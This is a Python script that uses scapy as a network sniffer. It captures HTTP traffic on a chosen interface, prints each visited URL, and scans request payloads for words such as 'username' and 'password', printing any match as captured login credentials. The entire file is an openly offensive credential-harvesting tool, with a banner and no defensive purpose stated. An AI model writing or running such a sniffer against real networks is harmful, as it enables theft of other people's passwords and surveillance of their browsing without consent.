#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import optparse

def print_motd():
    print("""
 _     _ _______ _______ _     _
 |_____| |_____| |______ |_____|
 |     | |     | ______| |     |                               
""")

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i","--interface",dest="interface",help="Specify the Sniffing interface")
    options = parser.parse_args()[0]
    if not options.interface:
        print_motd()
        parser.error("[-]Please specify Sniffing interface. Type option -h / --help for help")
    else:
        return options

def sniff(interface):
    try:
        print_motd()
        print("[+]Sniffing started on interface: "+ interface)
        print("[+]Press Ctrl + C to abort sniffing ")
        scapy.sniff(iface=interface,store=False,prn=process_sniffed_packets)
    except KeyboardInterrupt:
        print("[+]Detected Ctrl + C .. Sniffing Aborted")

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["uname", "username", "password", "user", "login", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        url = get_url(packet)
        if "jpg" in url:
            print("[+]Found images in browsing ====> " + "http://" + url)
        else:
            print("[+]Found browsing URL ====> " + "http://" + url)
        login_info = get_login_info(packet)
        if login_info :
            print("\n\n[+]Found login credentials ====> " + login_info + "\n\n")

options = get_arguments()
try:
    sniff(options.interface)
except KeyboardInterrupt:
    print("[+]Detected Ctrl + C .. Sniffing Aborted")
